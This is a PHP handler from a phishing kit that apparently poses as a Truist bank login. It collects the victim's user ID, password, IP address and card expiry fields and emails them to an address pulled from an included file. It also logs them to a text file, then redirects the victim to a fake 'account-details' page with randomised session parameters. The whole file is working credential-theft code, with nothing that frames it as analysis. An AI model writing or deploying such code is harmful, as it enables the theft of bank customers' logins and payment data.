<?php
$zabi = getenv("REMOTE_ADDR");
include('email.php');
$message .= "--------------  LOGIN 2 -------------\n";
$message .= "User ID : ".$_POST['user']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "---------------------------------\n";
$cc = $_POST['ccn'];
$subject = "Truist [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: TRUIST0HER0- <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

$file = fopen("Z.txt", 'a');



fwrite($file, $message);

header("Location: info.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
